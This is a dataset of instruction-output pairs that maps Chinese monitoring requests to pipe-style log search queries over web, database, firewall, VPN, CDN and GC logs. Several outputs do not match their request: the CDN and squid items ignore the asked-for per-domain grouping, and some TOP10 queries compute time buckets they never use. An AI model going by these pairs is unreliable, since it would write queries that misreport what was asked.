{"input": "按每30分钟分桶统计响应最慢资源TOP10。", "instruction": "Apache日志数据，编写查询语句实现如下分析场景", "output": "appname:apache tag:access middleware.req_time:>0 [[appname:apache tag:access middleware.req_time:>0|stats avg(middleware.req_time) as avg_ by middleware.request_path|sort by avg_|limit 10|fields  middleware.request_path]] | bucket timestamp span=30m as ts|stats avg(middleware.req_time)  as avg_ by middleware.request_path,ts|rename avg_ as \"请求时长\""}
{"input": "按每30分钟分桶统计响应最慢资源TOP10。", "instruction": "瑞数waf数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:river waf.cost:>0 [[appname:waf tag:river waf.cost:>0|stats avg(waf.cost) as avg_ by waf.uri|sort by avg_|limit 10|fields  waf.uri]] | bucket timestamp span=30m as ts|stats avg(waf.cost)  as avg_ by waf.uri,ts|rename avg_ as \"请求时长\""}
{"input": "按每5分钟分桶统计postgresql数据库慢日志平均耗时趋势。", "instruction": "postgresql日志数据，编写查询语句实现如下分析场景", "output": "appname:postgresql   postgresql.duration:* | bucket timestamp span=5m as ts| stats avg(postgresql.duration) as avg_duration by postgresql.database,ts"}
{"input": "按每5分钟分桶统计mongodb执行语句平均耗时趋势。", "instruction": "mongodb日志数据，编写查询语句实现如下分析场景", "output": "appname:mongodb |bucket timestamp span=5m as ts|stats avg(mongodb.cost) as avg_cost by ts\n"}
{"input": "按每5分钟分桶统计银证转账资金进出趋势。", "instruction": "同花顺数据，编写查询语句实现如下分析场景", "output": "appname:ths THS.REQTYPE:/(E|F)/ THS.ANSTYPE:\" \" | bucket timestamp span=5m as ts | stats sum(THS.WTJG) as RMB by ts,THS.REQTYPE"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是1小时。统计全部访问IP总流量，时间轴和流量单位均采用人类可读格式", "output": "appname:cdn_log|bucket timestamp span=1h as ts|stats sum(cdn.request_length) as total by ts | eval time=formatdate(ts,\"yyyy-MM-dd HH\")|eval traffic=format(\"%.2fM\",total/1024/1024)"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1天。统计全部访问IP总流量，时间轴和流量单位均采用人类可读格式", "output": "appname:squid_log|bucket timestamp span=1d as ts|stats sum(squid.request_length) as total by ts | eval time=formatdate(ts,\"yyyy-MM-dd\")|eval traffic=format(\"%.2fM\",total/1024/1024)"}
{"input": "", "instruction": "CDN 日志中，以域名为单位，时间颗粒度是5分钟。统计全部访问IP总流量，时间轴和流量单位均采用人类可读格式", "output": "appname:cdn_log|bucket timestamp span=5m as ts|stats sum(cdn.request_length) as total by ts | eval time=formatdate(ts,\"yyyy-MM-dd HH:mm:ss\")|eval traffic=format(\"%.2fM\",total/1024/1024)"}
{"input": "各服务器流量负载分钟级趋势。", "instruction": "haproxy日志数据，编写查询语句实现如下分析场景", "output": " appname:haproxy|bucket timestamp span=5m as ts|stats avg(middleware.bytes) as avg_ by ts,middleware.server"}
{"input": "每小时大gc平均耗时。", "instruction": "jdk_gc数据，编写查询语句实现如下分析场景", "output": "appname:gc AND \"CMS-initial-mark\"|bucket timestamp span=1h as ts|stats avg(gc.GCREALTIME) as avgtime by ts|eval avgtime=if(empty(avgtime),0,avgtime)"}
{"input": "小GC每分钟平均耗时趋势。", "instruction": "jdk_gc数据，编写查询语句实现如下分析场景", "output": "appname:gc AND gc.invocations:*|bucket timestamp span=1m as ts|stats avg(gc.GCREALTIME) as avgtime by ts|eval avgtime=if(empty(avgtime),0,avgtime)|rename avgtime as '平均耗时'"}
{"input": "每小时大GC总耗时。", "instruction": "jdk_gc数据，编写查询语句实现如下分析场景", "output": "appname:gc AND \"CMS-initial-mark\"|bucket timestamp span=1h as ts|stats sum(gc.GCREALTIME) as sumtime by ts|eval sumtime=if(empty(sumtime),0,sumtime)"}
{"input": "业务流量按1分钟级趋势监控。", "instruction": "奥飞CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:aofei |bucket timestamp span = 1m as ts |  stats sum(cdn.body_size) by appname,ts"}
{"input": "业务各节点流量按 1 分钟趋势监控。", "instruction": "华为CDN数据数据，编写查询语句实现如下分析场景", "output": "appname:cdn tag:huawei |bucket timestamp span = 1m as ts |  stats sum(cdn.body_size) by tag,ts"}
{"input": "GC每分钟停顿时长趋势。", "instruction": "jdk_gc数据，编写查询语句实现如下分析场景", "output": "appname:gc AND gc.stoptime:*|bucket timestamp span=1m as ts|stats sum(gc.stoptime) as sumtime by ts|eval sumtime=if(empty(sumtime),0,sumtime)|rename sumtime as '停顿时长'"}
{"input": "", "instruction": "squid 日志中，以域名为单位，时间颗粒度是1月。统计全部访问IP总流量，时间轴和流量单位均采用人类可读格式", "output": "appname:squid_log|bucket timestamp span=1M as ts|stats sum(squid.request_length) as total by ts | eval time=formatdate(ts,\"yyyy-MM\")|eval traffic=format(\"%.2fM\",total/1024/1024)"}
{"input": "核心系统。系统名cbv7，total_cost记录为毫秒数。请按每 10 分钟分桶统计秒级的平均耗时，并保留小数点后 2 位。。", "instruction": "查询某系统的响应时间", "output": "appname:cbv7 tag:tuxedo cbv7.total_cost:* | eval total_cost=cbv7.total_cost / 1000 | bucket timestamp span=10m as ts | stats avg(total_cost) as _avg by ts | eval avg_cost=format(\"%.2f\",_avg)"}
{"input": "现代化支付系统。系统名cnap，当respSysId字段值为 CNAP 时，可以按logId 字段分组统计时间戳的最大值、最小值，二者相减就是每个logId的交易耗时。然后按每 10 分钟统计耗时的均值，保留小数点后 2 位。。", "instruction": "查询某系统的响应时间", "output": "appname:cnap cnap.respSysId:CNAP cnap.action:* | stats min(timestamp) as _min,max(timestamp) as _max by cnap.logId | eval cost=_max-_min | bucket _min span=10m as ts | stats avg(cost) as _avg by ts | eval avg_cost=format(\"%.2f\",_avg) "}
{"input": "按每 1 天分组统计。", "instruction": "上个月Mysql数据库最大用户连接数", "output": "starttime=\"-1M/M\" endtime=\"now/M\" appname:database tag:metric os.moType:MySQL AND os.dis:用户连接数 AND os.name:官网核心数据库-主库 |bucket timestamp span=1d as ts |eval os.value=todouble(os.value) |stats max(os.value) as max_value by ts "}
{"input": "物理日志使用量，圆整到 6 分钟前至 1 分钟前的整秒数，按每分钟统计使用量均值。", "instruction": "informix日志数据，编写查询语句实现如下分析场景", "output": "starttime=\"-5m/m\" endtime=\"now/m\"\nappname:informix tag:online_log |  bucket timestamp span=1m as ts| stats avg(informix.plog_used) as count_1"}
{"input": "按每 1 小时分组统计。", "instruction": "linux昨天内存使用趋势图", "output": "starttime=\"now-1d/d\" endtime=\"now\"  appname:top_info_system_stats |bucket timestamp span=1h as ts |stats avg(Mem.used_percent) as cnt by ts |eval day=formatdate(ts,\"yyyy-MM-dd\") |eval hour=formatdate(ts,\"HH:mm\")"}
{"input": "按每 1 小时分组统计。", "instruction": "linux昨天cpu使用趋势图", "output": "starttime=\"now-1d/d\" endtime=\"now\"  appname:top_info_system_stats |bucket timestamp span=1h as ts |eval cpu_uesd=(100-cpu.idle_percent)/100 |stats avg(cpu_uesd) as cnt by ts |eval day=formatdate(ts,\"yyyy-MM-dd\") |eval hour=formatdate(ts,\"HH:mm\")"}
{"input": "按每 1 天 和主机名分组统计。", "instruction": "Linux操作系统审计_CPU最大使用率指标趋势", "output": "appname:top_info_system_stats | bucket timestamp span=1d as _time |eval per=100-cpu.idle_percent |stats max(per) as cnt by hostname,_time"}
{"input": "按每 1 天和 ip分组统计。", "instruction": "Linux操作系统审计_CPU平均使用率指标趋势", "output": "appname:top_info_system_stats |bucket timestamp span=1d as _time |eval per=100-cpu.idle_percent |stats avg(per) as cnt by ip,_time"}
{"input": "按每 1天和主机名分组统计。", "instruction": "Linux操作系统审计_内存最大使用率指标趋势", "output": "appname:top_info_system_stats |bucket timestamp span=1d as _time |stats max(Mem.used_percent) as cnt by hostname,_time"}
{"input": "按每 1天和 ip 分组统计。", "instruction": "Linux操作系统审计_内存平均使用率指标趋势", "output": "appname:top_info_system_stats |bucket timestamp span=1d as _time |stats avg(Mem.used_percent) as cnt by ip,_time"}
{"input": "按每 1 天和 ip 地址分组统计。", "instruction": "Linux操作系统审计_磁盘根目录最大使用率指标趋势", "output": "appname:top_info_disk_stats AND disk.path:\"/\" |bucket timestamp span=1d as time |stats max(disk.used_percent) as value by ip,time"}
{"input": "按每 1 天和主机名分组统计。", "instruction": "Linux操作系统审计_磁盘根目录平均使用率趋势", "output": "appname:top_info_disk_stats AND disk.path:\"/\" |bucket timestamp span=1d as _time |stats avg(disk.used_percent) as value by hostname,_time"}
{"input": "按每 1 小时和主机名分组统计。", "instruction": "CPU平均使用率趋势", "output": "appname:top_info_system_stats |bucket timestamp span=1h as _time |eval per=100-cpu.idle_percent |stats avg(per) as cnt by hostname,_time"}
{"input": "按每 1 小时和 ip 地址分组统计。", "instruction": "内存平均使用率趋势", "output": "appname:top_info_system_stats |bucket timestamp span=1h as _time |stats avg(Mem.used_percent) as cnt by ip,_time"}
{"input": "按每 1 小时和主机名分组统计。", "instruction": "磁盘根目录平均使用率趋势", "output": "appname:top_info_disk_stats AND disk.path:\"/\" |bucket timestamp span=1h as time |stats avg(disk.used_percent) as value by hostname,time"}
{"input": "按每小时分桶统计登录事件事件趋势。", "instruction": "DellEMC数据，编写查询语句实现如下分析场景", "output": "appname:emc tag:dell  emc.login_detail.Username:* | bucket timestamp span=1h as ts | stats count() as cnt by ts,emc.result"}
{"input": "按每分钟分桶统计实时故障趋势。", "instruction": "中数通STB数据数据，编写查询语句实现如下分析场景", "output": "appname:stb NOT stb.kvmsg.cmd:login|bucket timestamp span=1m as ts|stats count() as count_ by stb.kvmsg.logtype_dec,ts|rename stb.kvmsg.logtype_dec as \"类型\",count_ as \"数量\""}
{"input": "按每30分钟分桶统计NSFOCUS昨天的访问量趋势变化。", "instruction": "绿盟防火墙日志数据，编写查询语句实现如下分析场景", "output": "starttime=\"now-1d/d\" endtime=\"now/d\" appname:firewall  |bucket timestamp span=30m as ts |stats count()  as count_ by ts |eval time=formatdate(ts,\"HH:mm\")"}
{"input": "按每30分钟分桶统计NSFOCUS_拒绝会话趋势变化图。", "instruction": "绿盟防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:nsfocus NOT firewall.msg.action:accept |bucket timestamp span=30m as ts |stats count() as count_ by ts |eval time=formatdate(ts,\"HH:mm\")"}
{"input": "按每30分钟分桶统计登录失败趋势。", "instruction": "Jumpserver堡垒机数据，编写查询语句实现如下分析场景", "output": "appname:fortress tag:jumpserver  fortress.log_type:login_log fortress.status:false\n|bucket timestamp span=30m as ts \n| stats count() as cnt by ts \n| rename cnt as fail"}
{"input": "按每30分钟分桶统计coremail_登录情况。", "instruction": "coremail数据，编写查询语句实现如下分析场景", "output": "(appname:core tag:imap)  mail.action:*log* | bucket timestamp span=30m as ts |stats count() as cnt by mail.action,ts"}
{"input": "每10分钟统计PaloAlto_策略拒绝事件趋势图。", "instruction": "FirewallPaloAlto数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:paloalto AND firewall.action:deny |bucket timestamp span=10m as ts | stats count() as ct by ts | rename ct as \"事件数量\""}
{"input": "每10分钟统计播放次数_点播卡顿占比_MOS分值。", "instruction": "机顶盒数据，编写查询语句实现如下分析场景", "output": "appname:stb_vixtel_sotthas stb_vixtel_sotthas.hasQoE:>=0 stb_vixtel_sotthas.freezeTime:>=0\nstb_vixtel_sotthas.downloadTime:>=0 NOT stb_vixtel_sotthas.programName:未知\n|bucket timestamp span=10m as ts\n|eval hasQoE=todouble(stb_vixtel_sotthas.hasQoE)\n|eval freezeTime=todouble(stb_vixtel_sotthas.freezeTime)\n|eval downloadTime=todouble(stb_vixtel_sotthas.downloadTime)\n|eval freezeRate=(freezeTime/1000000)/downloadTime\n|stats count(stb_vixtel_sotthas.programName) as playCount,avg(freezeRate) as avg_freezeRate,avg(hasQoE) as avg_hasQoE by ts\n|eval avg_freezeRate_1=format(\"%.2f\",avg_freezeRate)\n|eval avg_hasQoE_1=format(\"%.2f\",avg_hasQoE)"}
{"input": "按每小时分桶统计各等级事件趋势。", "instruction": "交换机_华为数据，编写查询语句实现如下分析场景", "output": "appname:switch tag:huawei |bucket timestamp span=1h as ts|stats count() as count_ by ts,switch.describe"}
{"input": "按每小时分桶统计PaloAlto_THREAT事件趋势。", "instruction": "FirewallPaloAlto数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:paloalto AND firewall.type:THREAT |bucket timestamp span=1h as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "按每小时分桶统计攻击类型_特征模型事件趋势。", "instruction": "Imperva_waf数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:imperva AND waf.attack_type:特征模型 |bucket timestamp span=1h as ts |stats count() by ts | eval hour = formatdate(ts, \"HH:mm\") | eval d=\"特征模型\""}
{"input": "按每小时分桶统计攻击类型_关联事件趋势。", "instruction": "Imperva_waf数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:imperva AND waf.attack_type:关联 |bucket timestamp span=1h as ts |stats count() by ts | eval hour = formatdate(ts, \"HH:mm\") | eval d=\"关联\""}
{"input": "按每小时分桶统计攻击类型_特征码事件趋势。", "instruction": "Imperva_waf数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:imperva AND waf.attack_type:特征码 |bucket timestamp span=1h as ts |stats count() by ts | eval hour = formatdate(ts, \"HH:mm\") | eval d=\"特征码\""}
{"input": "按每小时分桶统计防火墙日志事件趋势by协议。", "instruction": "网御星云防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:leadsec |bucket timestamp span=1h as ts | stats count() as cnt by ts,firewall.proto"}
{"input": "按每小时分桶统计高风险模块事件趋势，展示前 10 条。", "instruction": "交换机_华为数据，编写查询语句实现如下分析场景", "output": "appname:switch tag:huawei switch.severity:<4 [[appname:switch tag:huawei switch.severity:<4 | top 10 switch.module|fields switch.module]] | bucket timestamp span=1h as ts|stats count() as count_ by ts,switch.module"}
{"input": "按每小时分桶统计登录失败最多源主机登录趋势，展示前 10 条。", "instruction": "交换机_华为数据，编写查询语句实现如下分析场景", "output": "appname:switch tag:huawei (switch.brief:LOGINFAILED OR switch.brief: LOGINFAIL OR switch.brief:LOGINFAILED OR switch.brief:LOGIN_FAIL OR switch.brief:SNMP_FAIL OR switch.brief:SSH_FAIL) [[appname:switch tag:huawei (switch.brief:LOGINFAILED OR switch.brief: LOGINFAIL OR switch.brief:LOGINFAILED OR switch.brief:LOGIN_FAIL OR switch.brief:SNMP_FAIL OR switch.brief:SSH_FAIL) |top 10 switch.kvmsg.IpAddress|fields switch.kvmsg.IpAddress]] |bucket timestamp span=1h as ts|stats count() as count_ by ts,switch.kvmsg.IpAddress"}
{"input": "按每30分钟分桶统计PaloAlto事件量趋势。", "instruction": "FirewallPaloAlto数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:paloalto |bucket timestamp span=30m as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "按每30分钟分桶统计PaloAlto_Traffic事件趋势。", "instruction": "FirewallPaloAlto数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:paloalto AND firewall.type:TRAFFIC |bucket timestamp span=30m as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "按每30分钟分桶统计用户登录趋势。", "instruction": "深信服VPN日志数据，编写查询语句实现如下分析场景", "output": "appname:vpn vpn.login_user:root vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "按每30分钟分桶统计不同攻击的变化趋势图。", "instruction": "防病毒_SEPM数据，编写查询语句实现如下分析场景", "output": "appname:antivirus_gateway tag:symantec  SID|bucket timestamp span=30m as ts | stats count() by 'antivirus_gateway.msg',ts"}
{"input": "按每30分钟分桶统计waf_fortinet_各类事件发展趋势。", "instruction": "WAF_飞塔数据，编写查询语句实现如下分析场景", "output": "appname:waf tag:fortinet |bucket timestamp span=30m as ts | stats count() as cnt by waf.kv.type,ts"}
{"input": "按每30分钟分桶统计直播流视频。", "instruction": "机顶盒分析_24号数据数据，编写查询语句实现如下分析场景", "output": "appname:stb_vixtel_smpegts stb_vixtel_smpegts.avgMos:>=0 stb_vixtel_smpegts.tsLostRate:>=0\nstb_vixtel_smpegts.avgThroughput:>=0 NOT stb_vixtel_smpegts.programName:未知\n|bucket timestamp span=30m as ts\n|eval avgThroughput=todouble(stb_vixtel_smpegts.avgThroughput)\n|stats count(stb_vixtel_smpegts.programName) as playCount,avg(avgThroughput) as avg_avgThroughput by ts\n|eval avg_avgThroughput_1=format(\"%.2f\",avg_avgThroughput/1000000)"}
{"input": "按每30分钟分桶统计丢包率趋势。", "instruction": "机顶盒分析_24号数据数据，编写查询语句实现如下分析场景", "output": "appname:stb_vixtel_smpegts stb_vixtel_smpegts.avgMos:>=0 stb_vixtel_smpegts.tsLostRate:>=0\nstb_vixtel_smpegts.avgThroughput:>=0 NOT stb_vixtel_smpegts.programName:未知\n|bucket timestamp span=30m as ts\n|eval tsLostRate=todouble(stb_vixtel_smpegts.tsLostRate)\n|stats count(stb_vixtel_smpegts.programName) as playCount,avg(tsLostRate) as avg_tsLostRate by ts\n|eval avg_tsLostRate_1=format(\"%.2f\",avg_tsLostRate)"}
{"input": "按每30分钟分桶统计直播用户体验质量mos趋势。", "instruction": "机顶盒分析_24号数据数据，编写查询语句实现如下分析场景", "output": "\nappname:stb_vixtel_smpegts stb_vixtel_smpegts.avgMos:>=0 stb_vixtel_smpegts.tsLostRate:>=0\nstb_vixtel_smpegts.avgThroughput:>=0 NOT stb_vixtel_smpegts.programName:未知\n|bucket timestamp span=30m as ts\n|eval avgMos=todouble(stb_vixtel_smpegts.avgMos)\n|stats count(stb_vixtel_smpegts.programName) as playCount,avg(avgMos) as avg_avgMos by ts\n|eval avg_avgMos_1=format(\"%.2f\",avg_avgMos)"}
{"input": "按每30分钟分桶统计直播花屏占比趋势。", "instruction": "机顶盒分析_24号数据数据，编写查询语句实现如下分析场景", "output": "appname:stb_vixtel_smpegts (stb_vixtel_smpegts.freezeTime:>=0 AND stb_vixtel_smpegts.downloadTime:>=0)\n|bucket timestamp span=30m as ts\n|eval freezeTime=tolong(stb_vixtel_smpegts.freezeTime)\n|eval downloadTime=tolong(stb_vixtel_smpegts.downloadTime)\n| stats count(stb_vixtel_smpegts.programName) as playCount,avg(freezeTime) as freezeTime1,avg(downloadTime) as downloadTime1 by ts\n|eval liveFreezeRate=format(\"%.3f\",(freezeTime1/1000000)/downloadTime1)"}
{"input": "按每30分钟分桶统计用户登录趋势。", "instruction": "深信服零信任VPN数据，编写查询语句实现如下分析场景", "output": "appname:vpn (vpn.event_name:auth OR vpn.event_name:login OR vpn.event_name:logout) vpn.user_name:root   | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "按每30分钟分桶统计用户登录趋势。", "instruction": "Cisco_VPN日志数据，编写查询语句实现如下分析场景", "output": "appname:vpn vpn.login_user:root vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "按每5分钟分桶统计每个用户的堡垒机登陆时间分布，先搜索 BLJPri xwin 关键字。", "instruction": "帕拉迪堡垒机数据，编写查询语句实现如下分析场景", "output": "( appname:fortress tag:pldsec ) \"BLJPri xwin\" sessiontype=login|bucket timestamp span=5m as ts|stats count() as ct by ts,fortress.user"}
{"input": "按每5分钟分桶统计每个用户的堡垒机登陆时间分布，先搜索 BLJPri UMA 关键字。", "instruction": "帕拉迪堡垒机数据，编写查询语句实现如下分析场景", "output": "( appname:fortress tag:pldsec ) \"BLJPri UMA\" type=login|bucket timestamp span=5m as ts|stats count() as ct by ts,fortress.msg.sysuser"}
{"input": "按每5分钟分桶统计华三入侵防御系统事件量趋势。", "instruction": "华三入侵防御系统日志数据，编写查询语句实现如下分析场景", "output": "appname:ips AND tag:h3c |bucket timestamp span=5m as ts | stats count() as cnt by ts,hostname"}
{"input": "按每5分钟分桶统计启明星辰入侵防御系统事件趋势。", "instruction": "启明星辰入侵防御系统日志数据，编写查询语句实现如下分析场景", "output": "appname:ips AND tag:venustech |bucket timestamp span=5m as ts |stats count() as cnt by ts,hostname"}
{"input": "", "instruction": "今天vpn登陆次数，按30分钟统计趋势", "output": "starttime=\"now/d\" appname:vpn vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "firewall_h3c_每小时arp攻击趋势by_host。", "instruction": "华三防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:h3c | bucket timestamp span=1h as ts | stats count() as cnt by ts,firewall.host"}
{"input": "firewall_h3c_每小时攻击趋势by_ip。", "instruction": "华三防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:h3c | bucket timestamp span=1h as ts | stats count() as cnt by ts,firewall.dup_add"}
{"input": "firewall_h3c_每小时ARP攻击包趋势。", "instruction": "华三防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:h3c | bucket timestamp span=1h as ts | stats count() as cnt by ts,firewall.source"}
{"input": "启明星辰防火墙每5分钟日志事件量趋势。", "instruction": "启明星辰防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall AND tag:venustech |bucket timestamp span=5m as ts |stats count() as cnt by ts,hostname"}
{"input": "PaloAlto_THREAT事件每 30 分钟趋势。", "instruction": "FirewallPaloAlto数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:paloalto AND firewall.type:THREAT |bucket timestamp span=30m as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "算每小时的Traffic事件趋势。", "instruction": "FirewallPaloAlto数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:paloalto AND firewall.type:TRAFFIC |bucket timestamp span=1h as ts | stats count() as total by ts|rename total as \"数量\""}
{"input": "今天vpn登陆趋势。", "instruction": "深信服VPN日志数据，编写查询语句实现如下分析场景", "output": "starttime=\"now/d\" appname:vpn vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "最近一天各个风险等级事件趋势。", "instruction": "h3c_dbaudit数据，编写查询语句实现如下分析场景", "output": "starttime=\"-1d\" appname:dbaudit |bucket timestamp span=30m as ts | stats count() as cnt by ts,dbaudit.level"}
{"input": "今天vpn登陆趋势。", "instruction": "Cisco_VPN日志数据，编写查询语句实现如下分析场景", "output": "starttime=\"now/d\" appname:vpn vpn.actype:login  | bucket timestamp span=30m as ts|stats count() as cnt by vpn.result,ts"}
{"input": "按每 1 天分组统计。", "instruction": "DB2数据库不同级别事件趋势", "output": "appname:db2 |bucket timestamp span=1d as ts |stats count() as cnt by ts,db2.LEVEL"}
{"input": "DNS请求返回趋势图，每小时统计一次。", "instruction": "DNS_yamu数据，编写查询语句实现如下分析场景", "output": "* appname:DNS |  bucket timestamp span=1h as ts |stats count() as count_  by DNS.status,ts "}
{"input": "DNS请求业务量变化，每天统计一次。", "instruction": "DNS_yamu数据，编写查询语句实现如下分析场景", "output": "* appname:DNS |  bucket timestamp span=1d as ts | stats count() as count_ by ts "}
{"input": "每20分钟统计一次飞塔事件趋势图，X轴时间格式设置为MM/dd HH:mm。", "instruction": "防火墙_飞塔数据，编写查询语句实现如下分析场景", "output": "(* AND appname:firewall tag:fortinet) |bucket timestamp span=20m as ts |stats count() as _count by ts | eval time = formatdate(ts,\"MM/dd HH:mm\")"}
{"input": "每15分钟统计ArrayVPN用户访问趋势图。", "instruction": "ArrayVPN数据，编写查询语句实现如下分析场景", "output": "appname:vpn tag:array | bucket timestamp span=15m as ts |stats count() by ts| eval time = formatdate(ts,\"HH:mm\")"}
{"input": "每10分钟统计tcp状态分类趋势。", "instruction": "linux性能数据，编写查询语句实现如下分析场景", "output": "* AND appname:process process.local_addr:* process.proto:tcp  |eval t=process.proto+\"_\"+process.state |bucket timestamp span=10m as ts |stats count() as cnt by t,ts"}
{"input": "每10分钟统计aix主机登录成功趋势。", "instruction": "aix日志数据，编写查询语句实现如下分析场景", "output": "appname:aix AND \"Login successful for\" |bucket timestamp span=10m as ts|stats count() as ct by aix.dst_host,ts"}
{"input": "每10分钟统计防火墙各协议事件趋势。", "instruction": "cisco_asa防火墙数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:cisco_asa | bucket timestamp span=10m as ts| stats count() as cnt by firewall.transport,ts"}
{"input": "每10分钟统计阻断事件趋势。", "instruction": "dell防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:dell \"blocked\" | bucket timestamp span=10m as ts1|stats count() by ts1"}
{"input": "每10分钟统计丢弃事件趋势。", "instruction": "dell防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:dell \"dropped\" | bucket timestamp span=10m as ts1|stats count() by ts1"}
{"input": "每10分钟统计疑似端口扫描事件趋势。", "instruction": "dell防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:dell \"scan detected\" | bucket timestamp span=10m as ts1|stats count() by ts1\n"}
{"input": "每10分钟统计高危事件趋势。", "instruction": "dell防火墙日志数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:dell \"highly insecure\"|bucket timestamp span=10m as ts1|stats count() by ts1\n"}
{"input": "每10分钟统计请求类型事件趋势。", "instruction": "ips_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ips  tag:nsfocus | bucket timestamp span=10m as ts | stats count() as a by ips.event_name,ts | rename a as \"请求次数\""}
{"input": "每10分钟统计waf_imperva_攻击名称趋势。", "instruction": "waf_imperva_数据，编写查询语句实现如下分析场景", "output": "appname:waf  tag:imperva |bucket timestamp span=10m as ts |stats count() by waf.event_name,ts"}
{"input": "每10分钟统计waf_imperva_服务器受攻击趋势。", "instruction": "waf_imperva_数据，编写查询语句实现如下分析场景", "output": "appname:waf  tag:imperva |bucket timestamp span=10m as ts |stats count() by waf.dst_ip,ts"}
{"input": "每10分钟统计中间件_nginx_请求方式趋势图。", "instruction": "中间件_nginx_数据，编写查询语句实现如下分析场景", "output": "appname:nginx tag:access |bucket timestamp span=10m as ts |stats count() by ts,middleware.request_method"}
{"input": "每10分钟统计策略拒绝事件趋势图。", "instruction": "firewall_novel_数据，编写查询语句实现如下分析场景", "output": "appname:firewall tag:novel AND firewall.action:deny |bucket timestamp span=10m as ts | stats count() as ct by ts | rename ct as \"事件数量\""}
{"input": "每10分钟统计各级别日志量趋势。", "instruction": "zookeeper日志数据，编写查询语句实现如下分析场景", "output": "appname:zookeeper tag:zookeeper_log |bucket timestamp span=10m as ts|stats count() as cnt by ts,middleware.level"}
{"input": "每10分钟统计服务器负载均衡分析。", "instruction": "haproxy日志数据，编写查询语句实现如下分析场景", "output": "appname:haproxy|bucket timestamp span=10m as ts|stats count() as cnt by ts,middleware.server"}
{"input": "每10分钟统计WLS分级别日志趋势图。", "instruction": "webLogic日志数据，编写查询语句实现如下分析场景", "output": "appname:weblogic|bucket timestamp span=10m as ts|stats count() by middleware.severity, ts"}
{"input": "每10分钟统计IPS请求类型事件趋势。", "instruction": "ips_legendsec数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:legendsec| bucket timestamp span=10m as ts | stats count() as a by ips.event_name,ts | rename a as \"请求次数\""}
{"input": "每10分钟统计各类事件趋势。", "instruction": "ids_huawei数据，编写查询语句实现如下分析场景", "output": "appname:ids tag:huawei|bucket timestamp span=10m as ts | stats count() as cnt by ids.brief,ts"}
{"input": "每10分钟统计用户审计动作趋势。", "instruction": "奇安信AC数据，编写查询语句实现如下分析场景", "output": "appname:ac tag:qianxin ac.log_type:auth ac.action:* \n| bucket timestamp span=10m as ts \n|stats count() as cnt by ts,ac.action"}
{"input": "每10分钟统计中间件_kingdee_请求方式趋势图。", "instruction": "金蝶kingdee数据，编写查询语句实现如下分析场景", "output": "appname:kingdee tag:access |bucket timestamp span=10m as ts |stats count() by ts,middleware.method"}
{"input": "每10分钟统计收到威胁目的地址TOP10。", "instruction": "ids_huawei数据，编写查询语句实现如下分析场景", "output": "appname:ids tag:huawei ids.attack_name:* |bucket timestamp span=10m as ts | stats count() as cnt by ids.dst_ip|limit 10"}
{"input": "每10分钟统计威胁来源地址TOP10。", "instruction": "ids_huawei数据，编写查询语句实现如下分析场景", "output": "appname:ids tag:huawei ids.attack_name:* |bucket timestamp span=10m as ts | stats count() as cnt by ids.src_ip|limit 10"}
{"input": "按每小时分桶统计cisco_nexus各等级事件趋势。", "instruction": "交换机_cisco_nexus数据，编写查询语句实现如下分析场景", "output": "appname:switch AND tag:cisco_nexus |bucket timestamp span=1h as ts|stats count() as count_ by ts,switch.describe"}
{"input": "按每小时分桶统计cisco_ios各等级事件趋势。", "instruction": "交换机_cisco_ios数据，编写查询语句实现如下分析场景", "output": "appname:switch tag:cisco_ios |bucket timestamp span=1h as ts|stats count() as count_ by ts,switch.describe"}
{"input": "按每小时分桶统计F5事件趋势。", "instruction": "F5数据，编写查询语句实现如下分析场景", "output": "appname:loadbalancing tag:f5|bucket timestamp span=1h as ts|stats count() as ct by ts,loadbalancing.level|rename ct as \"事件量\""}
{"input": "按每小时分桶统计总访问请求趋势。", "instruction": "ips_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ips tag:nsfocus | bucket timestamp span=1h as ts | stats count() as count_  by appname,ts"}
{"input": "按每小时分桶统计被攻击趋势图。", "instruction": "ips_nsfocus数据，编写查询语句实现如下分析场景", "output": "appname:ips  tag:nsfocus | bucket timestamp span=1h as ts | stats count(ips.dst.geo.ip) by appname,ts"}
{"input": "按每小时分桶统计负载均衡_piolink_健康检查趋势。", "instruction": "负载均衡_piolink_数据，编写查询语句实现如下分析场景", "output": "appname:loadbalancing tag:piolink loadbalancing.type:Service-health-check| bucket timestamp span=1h as ts |stats count() by ts "}
